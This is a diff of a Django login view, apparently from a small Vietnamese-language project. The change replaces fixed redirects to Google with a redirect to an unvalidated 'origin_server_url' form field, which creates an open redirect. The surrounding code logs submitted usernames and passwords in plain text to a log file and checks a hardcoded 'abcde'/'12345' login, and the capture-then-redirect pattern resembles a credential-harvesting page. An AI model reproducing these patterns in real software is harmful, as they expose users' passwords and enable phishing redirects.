@@ -5,7 +5,7 @@ from .models import inforLogin
 import logging
 from django.contrib import messages
 
-logging.basicConfig(filename='app.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(filename='log/app.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def login(request):
     usg_id = request.GET.get('UI', '')
@@ -42,7 +42,8 @@ def login_submit(request):
         else: 
             logger = logging.getLogger(__name__)
             logger.info(infor)
-            return redirect("https://www.google.com")
+            os = request.POST.get('origin_server_url', 'https://google.com')
+            return redirect(os)
 
 
 def login_account_submit(request):
@@ -58,7 +59,8 @@ def login_account_submit(request):
             if inforuser[0]=="abcde" and inforuser[1]=="12345":
                 logger = logging.getLogger(__name__)
                 logger.info(inforuser)
-                return redirect("https://www.google.com")
+                os = request.POST.get('origin_server_url', 'https://google.com')
+                return redirect(os)
             else:
                 logger = logging.getLogger(__name__)
                 logger.warning(f"Sai tai khoan/mat khau {inforuser}")
